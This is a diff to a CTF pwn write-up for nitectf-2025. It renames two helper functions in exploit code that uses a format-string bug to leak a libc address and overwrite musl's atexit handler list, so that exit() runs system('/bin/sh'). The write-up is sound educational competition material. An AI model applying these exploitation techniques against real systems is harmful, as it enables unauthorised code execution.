@@ -3,7 +3,7 @@ title: nitectf-2025 - Pwn writeups
 published: 2025-12-16
 description: 'Writeup for the first two pwn challenges from nitectf-2025'
 image: './imgs/nitectf-logo.png'
-tags: [pwn,ctf,musl,format_string,shellcode,seccomp]
+tags: [Pwn,CTF,musl,format_string,shellcode,seccomp]
 category: 'CTF Writeups'
 draft: false 
 lang: ''
@@ -685,15 +685,15 @@ fake_struct = 0x404000 + 0x100
 Since our input is limited to 13 `%` we need split our payload, we can do that using these functions:
 
 ```python ShowLineNumbers=false
-def arb_write(addr, value):
+def write_byte(addr, value):
     payload = fmtstr_payload(8, {
         addr: p8(value)
     },no_dollars=True, write_size='byte')
     action(0, payload)
 
-def write_byte(addr, value):
+def arb_write(addr, value):
     for i in range(0, len(value)):
-        arb_write(addr + i, value[i])
+        write_byte(addr + i, value[i])
 ```
 
 Let's take a look at the fl struct:
@@ -728,10 +728,10 @@ We write the pointer to `/bin/sh` at offset `0x108`. This corresponds to `a[1]` 
 We set the slot counter to 1, indicating there's at least one registered handler. Without this, the exit mechanism might skip processing entirely.
 
 ```python ShowLineNumbers=false
-write_byte(head_addr, p64(fake_struct))
-write_byte(fake_struct + 0x8, p64(libc.sym.system))
-write_byte(fake_struct + 0x108, p64(next(libc.search(b'/bin/sh\x00'))))
-write_byte(slot_addr, p32(1)) 
+arb_write(head_addr, p64(fake_struct))
+arb_write(fake_struct + 0x8, p64(libc.sym.system))
+arb_write(fake_struct + 0x108, p64(next(libc.search(b'/bin/sh\x00'))))
+arb_write(slot_addr, p32(1)) 
 ```
 
 When exit() runs:
@@ -768,15 +768,15 @@ def action(idx, message):
     result = p.recvuntil(b'---MUD---', drop=True).strip()
     return result
 
-def arb_write(addr, value):
+def write_byte(addr, value):
     payload = fmtstr_payload(8, {
         addr: p8(value)
     },no_dollars=True, write_size='byte')
     action(0, payload)
 
-def write_byte(addr, value):
+def arb_write(addr, value):
     for i in range(0, len(value)):
-        arb_write(addr + i, value[i])
+        write_byte(addr + i, value[i])
 
 make_char(0,1,b'A'*32)
 libc.address = int(action(0,b'%p%p%p%p%p%p')[5:],16) - libc.symbols['__stdout_FILE']
@@ -787,10 +787,10 @@ slot_addr = libc.address + 0xc0fa4
 log.info(f'head: {hex(head_addr)}\t slot: {hex(slot_addr)}')
 fake_struct = 0x404000 + 0x100
 
-write_byte(head_addr, p64(fake_struct))
-write_byte(fake_struct + 0x8, p64(libc.sym.system))
-write_byte(fake_struct + 0x108, p64(next(libc.search(b'/bin/sh\x00'))))
-write_byte(slot_addr, p32(1)) 
+arb_write(head_addr, p64(fake_struct))
+arb_write(fake_struct + 0x8, p64(libc.sym.system))
+arb_write(fake_struct + 0x108, p64(next(libc.search(b'/bin/sh\x00'))))
+arb_write(slot_addr, p32(1)) 
 
 p.sendlineafter(b'>>',b'3')
 
